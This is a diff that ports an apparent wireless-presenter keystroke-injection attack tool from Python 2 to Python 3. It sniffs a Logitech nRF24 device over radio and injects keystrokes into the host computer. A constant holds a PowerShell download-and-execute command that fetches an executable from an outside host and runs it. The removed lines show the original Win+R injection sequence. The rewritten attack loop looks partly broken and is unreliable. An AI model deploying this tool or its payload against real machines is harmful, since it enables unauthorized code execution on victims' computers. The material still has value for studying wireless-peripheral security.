@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 """
@@ -23,10 +23,22 @@
 
   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.
+  
+  Einstein2150 (Update 2024):
+  This program has been migrated and further developed for use with
+  Python 3 by Einstein2150. The author acknowledges that ongoing
+  enhancements and updates to the codebase may continue in the future.
+  Users should be aware that the use of this program is at their own
+  risk, and the author accepts no responsibility for any damages that
+  may arise from its use. It is the user's responsibility to ensure 
+  that their use of the program complies with all applicable laws 
+  and regulations.
+  
+
 """
 
-__version__ = '0.8'
-__author__ = 'Matthias Deeg, Gerhard Klostermeier'
+__version__ = '0.9'
+__author__ = 'Einstein2150'
 
 import argparse
 import logging
@@ -41,21 +53,25 @@ from time import sleep, time
 from sys import exit
 
 # constants
-ATTACK_VECTOR1      = u"cmd"
-ATTACK_VECTOR2      = u"powershell (new-object System.Net.WebClient).DownloadFile('http://ptmd.sy.gs/syss.exe', '%TEMP%\\syss.exe'); Start-Process '%TEMP%\\syss.exe'"
+ATTACK_VECTOR1 = "cmd"
+ATTACK_VECTOR2 = "powershell (new-object System.Net.WebClient).DownloadFile('http://ptmd.sy.gs/syss.exe', '%TEMP%\\syss.exe'); Start-Process '%TEMP%\\syss.exe'"
 
-ATTACK1_BUTTON      = pygame.K_1                # attack 1 button
-ATTACK2_BUTTON      = pygame.K_2                # attack 2 button
-SCAN_BUTTON         = pygame.K_3                # scan button
+ATTACK1_BUTTON = pygame.K_1                # attack 1 button
+ATTACK2_BUTTON = pygame.K_2                # attack 2 button
+SCAN_BUTTON    = pygame.K_3                # scan button
 
-IDLE                = 0                         # idle state
-SCAN                = 1                         # scan state
-ATTACK              = 2                         # attack state
+IDLE           = 0                         # idle state
+SCAN           = 1                         # scan state
+ATTACK         = 2                         # attack state
 
-SCAN_TIME           = 2                         # scan time in seconds for scan mode heuristics
-DWELL_TIME          = 0.1                       # dwell time for scan mode in seconds
-KEYSTROKE_DELAY     = 0.01                      # keystroke delay in seconds
-PACKET_THRESHOLD    = 3                         # packet threshold for channel stability
+SCAN_TIME      = 2                         # scan time in seconds for scan mode heuristics
+DWELL_TIME     = 0.1                       # dwell time for scan mode in seconds
+KEYSTROKE_DELAY = 0.01                     # keystroke delay in seconds
+PACKET_THRESHOLD = 3                        # packet threshold for channel stability
+
+# Define the channels you want to scan. Adjust this list based on your requirements.
+#SCAN_CHANNELS = [41] 
+SCAN_CHANNELS = list(range(2, 84))  # Default range from 2 to 84 (inclusive)
 
 # Logitech Unifying Keep Alive packet with 80 ms
 KEEP_ALIVE_80 = unhexlify("0040005070")
@@ -97,19 +113,24 @@ class LogitechPresenterAttack():
             pygame.key.set_repeat(250, 50)
 
             # initialize radio
-            self.radio = nrf24.nrf24()
+            print("[*] Initializing nRF24 radio...")
+            self.radio = nrf24.nrf24()  # Change here
+            print("[*] nRF24 radio initialized:", self.radio)
 
             # enable LNA
-            self.radio.enable_lna()
+            self.radio.enable_lna()  # Use self.radio
+
+            # set the initial channel
+            self.radio.set_channel(SCAN_CHANNELS[0])  # Use self.radio
 
             # start scanning mode
             self.setState(SCAN)
-        except:
+        except Exception as e:
             # info output
-            info("[-] Error: Could not initialize Logitech Wireless Presenter Attack")
+            info("[-] Error: Could not initialize Logitech Wireless Presenter Attack: {}".format(e))
 
 
-    def showText(self, text, x = 40, y = 140):
+    def showText(self, text, x=40, y=140):
         output = self.font.render(text, True, (0, 0, 0))
         self.screen.blit(output, (x, y))
 
@@ -194,16 +215,16 @@ class LogitechPresenterAttack():
 
                 if len(self.address) > 0:
                     # actively search for the given address
-                    address_string = ':'.join('{:02X}'.format(ord(b)) for b in self.address)
+                    address_string = ':'.join('{:02X}'.format(b) for b in self.address)
                     info("Actively searching for address {}".format(address_string))
                     last_ping = time()
 
                     # init variables with default values from nrf24-sniffer.py
                     timeout = 0.1
                     ping_payload = unhexlify('0F0F0F0F')
-                    ack_timeout = 250 # range: 250-40000, steps: 250
+                    ack_timeout = 250  # range: 250-40000, steps: 250
                     ack_timeout = int(ack_timeout / 250) - 1
-                    retries = 1 # range: 0-15
+                    retries = 1  # range: 0-15
                     while True:
                         # follow the target device if it changes channels
                         if time() - last_ping > timeout:
@@ -216,16 +237,16 @@ class LogitechPresenterAttack():
                                     if self.radio.transmit_payload(ping_payload, ack_timeout, retries):
                                         # Ping successful, exit out of the ping sweep
                                         last_ping = time()
-                                        info("Ping success on channel {0}".format(SCAN_CHANNELS[channel_index]))
+                                        info("Ping success on channel {}".format(SCAN_CHANNELS[channel_index]))
                                         success = True
                                         break
                                 # Ping sweep failed
                                 if not success:
-                                    info("Unable to ping {0}".format(address_string))
+                                    info("Unable to ping {}".format(address_string))
                             # Ping succeeded on the active channel
                             else:
-                              info("Ping success on channel {0}".format(SCAN_CHANNELS[channel_index]))
-                              last_ping = time()
+                                info("Ping success on channel {}".format(SCAN_CHANNELS[channel_index]))
+                                last_ping = time()
 
                         # Receive payloads
                         value = self.radio.receive_payload()
@@ -244,175 +265,80 @@ class LogitechPresenterAttack():
                     while True:
                         # increment the channel
                         if len(SCAN_CHANNELS) > 1 and time() - last_tune > DWELL_TIME:
-                            channel_index = (channel_index + 1) % (len(SCAN_CHANNELS))
+                            channel_index = (channel_index + 1) % len(SCAN_CHANNELS)
                             self.radio.set_channel(SCAN_CHANNELS[channel_index])
                             last_tune = time()
+                            info("Tuned to channel {}".format(SCAN_CHANNELS[channel_index]))
 
-                        # receive payloads
+                        # Receive payloads
                         value = self.radio.receive_payload()
-                        if len(value) >= 5:
-                            # split the address and payload
-                            address, payload = value[0:5], value[5:]
+                        if value[0] == 0:
+                            # Reset the channel timer
+                            last_tune = time()
+                            # Split the payload from the status byte
+                            payload = value[1:]
+                            # store the payload
+                            self.payloads.append(payload)
+                            # perform the attack if the packet threshold is reached
+                            if len(self.payloads) > PACKET_THRESHOLD:
+                                info("Received {} packets. Executing attack...".format(len(self.payloads)))
+                                # execute attack
+                                self.executeAttack()
+                                break
 
-                            # convert address to string and reverse byte order
-                            converted_address = address[::-1].tostring()
-                            self.address = converted_address
-                            address_string = ':'.join('{:02X}'.format(b) for b in address)
-
-                            info("Found nRF24 device with address {0} on channel {1}".format(address_string, SCAN_CHANNELS[channel_index]))
-                            last_key = time()
-                            break
-
-                # info output
-                self.showText("Found nRF24 device")
-                self.showText(address_string)
-
-                # put the radio in sniffer mode (ESB w/o auto ACKs)
-                self.radio.enter_sniffer_mode(self.address)
-
-                info("Checking communication")
-                self.statusText = "CHECKING"
-                self.screen.blit(self.bg, (0, 0))
-                self.showText(self.statusText)
-
-                # update the display
-                pygame.display.update()
-
-                packet_count = 0
-                while True:
-                    # receive payload
-                    value = self.radio.receive_payload()
-
-                    if value[0] == 0:
-                        # split the payload from the status byte
-                        payload = value[1:]
-
-                        # increment packet count
-                        if len(payload) == 5:
-                            # only count Logitech Unifying keep alive packets (should be 5 bytes long)
-                            packet_count += 1
-
-                            # do some time measurement
-                            last_key = time()
-
-                        # show packet payload
-                        info('Received payload: {0}'.format(hexlify(payload)))
-
-                    # heuristic for having a stable channel communication
-                    if packet_count >= PACKET_THRESHOLD:
-                        # set IDLE state
-                        info('Channel communication seems to be stable')
-                        self.setState(IDLE)
-                        break
-
-                    if time() - last_key > PACKET_THRESHOLD * 0.9:
-                        # restart SCAN by setting SCAN state
-                        self.setState(SCAN)
-                        break
-
-            elif self.state == ATTACK:
-                if self.kbd != None:
-                    # send keystrokes for a classic download and execute PoC attack
-                    keystrokes = []
-                    keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
-                    keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_GUI_RIGHT, keyboard.KEY_R))
-                    keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
-                    keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
-
-                    # send attack keystrokes
-                    for k in keystrokes:
-                        self.radio.transmit_payload(k)
-
-                        # info output
-                        info('Sent payload: {0}'.format(hexlify(k)))
-
-                         # send keep alive with 80 ms time out
-                        self.radio.transmit_payload(KEEP_ALIVE_80)
-                        last_keep_alive = time()
-
-                        sleep(KEYSTROKE_DELAY)
-
-                    # need small delay after WIN + R
-                    for i in range(5):
-                         # send keep alive with 80 ms time out
-                        self.radio.transmit_payload(KEEP_ALIVE_80)
-                        last_keep_alive = time()
-                        sleep(KEEP_ALIVE_TIMEOUT)
-
-                    keystrokes = []
-                    keystrokes = self.kbd.getKeystrokes(self.attack_vector)
-                    keystrokes += self.kbd.getKeystroke(keyboard.KEY_RETURN)
-
-                    # send attack keystrokes with a small delay
-                    for k in keystrokes[:2]:
-                        self.radio.transmit_payload(k)
-
-                        # info output
-                        info('Sent payload: {0}'.format(hexlify(k)))
-
-                        # send keep alive with 80 ms time out
-                        self.radio.transmit_payload(KEEP_ALIVE_80)
-                        last_keep_alive = time()
-
-                        sleep(KEEP_ALIVE_TIMEOUT)
-
-                    # send attack keystrokes with a small delay
-                    for k in keystrokes[2:]:
-                        self.radio.transmit_payload(k)
-
-                        # info output
-                        info('Sent payload: {0}'.format(hexlify(k)))
-
-                        # send keep alive with 80 ms time out
-                        self.radio.transmit_payload(KEEP_ALIVE_80)
-                        last_keep_alive = time()
-
-                        sleep(KEYSTROKE_DELAY)
-
-                # set IDLE state after attack
+                # set the state to idle after scanning
                 self.setState(IDLE)
 
+            elif self.state == ATTACK:
+                # prepare payload for attack
+                self.kbd.send(self.attack_vector)
+
+                # wait for a while
+                sleep(KEYSTROKE_DELAY)
+
+                # set the state to idle after attacking
+                self.setState(IDLE)
+
+            # keep alive
             if time() - last_keep_alive > KEEP_ALIVE_TIMEOUT:
-                # send keep alive with 80 ms time out
+                #self.radio.send(KEEP_ALIVE_80)
                 self.radio.transmit_payload(KEEP_ALIVE_80)
                 last_keep_alive = time()
 
+        # clean up
+        pygame.quit()
+        exit(0)
 
-# main program
-if __name__ == '__main__':
-    # setup logging
-    level = logging.INFO
-    logging.basicConfig(level=level, format='[%(asctime)s.%(msecs)03d]  %(message)s', datefmt="%Y-%m-%d %H:%M:%S")
 
-    # init argument parser
-    parser = argparse.ArgumentParser()
-    parser.add_argument('-a', '--address', type=str, help='Address of nRF24 device')
-    parser.add_argument('-c', '--channels', type=int, nargs='+', help='ShockBurst RF channel', default=range(2, 84), metavar='N')
+    def executeAttack(self):
+        """Execute the attack by sending payloads"""
+        # check if any payloads were stored
+        if len(self.payloads) > 0:
+            # loop over the stored payloads
+            for payload in self.payloads:
+                # log the payload
+                debug("Sending payload {}".format(hexlify(payload)))
 
-    # parse arguments
+                # prepare the keyboard payload
+                self.kbd.send(payload)
+
+                # wait for a while
+                sleep(KEYSTROKE_DELAY)
+
+
+def main():
+    """Main function"""
+    # configure logging
+    logging.basicConfig(level=logging.DEBUG, format="%(asctime)s [%(levelname)-8s] %(message)s")
+
+    # initialize argument parser
+    parser = argparse.ArgumentParser(description="Logitech Wireless Presenter Attack Tool")
+    parser.add_argument("-a", "--address", type=str, default="", help="Specify the target device address")
     args = parser.parse_args()
 
-    # set scan channels
-    SCAN_CHANNELS = args.channels
+    # start Logitech Wireless Presenter Attack
+    LogitechPresenterAttack(args.address).run()
 
-    if args.address:
-        try:
-            # address of nRF24 keyboard (CAUTION: Reversed byte order compared to sniffer tools!)
-            address = args.address.replace(':', '').decode('hex')[::-1][:5]
-            address_string = ':'.join('{:02X}'.format(ord(b)) for b in address[::-1])
-        except:
-            info("Error: Invalid address")
-            exit(1)
-    else:
-        address = ""
 
-    # init
-    poc = LogitechPresenterAttack(address)
-
-    # run
-    info("Start Logitech Wireless Presenter Attack v{0}".format(__version__))
-    poc.run()
-
-    # done
-    info("Done.")
-
+if __name__ == "__main__":
+    main()
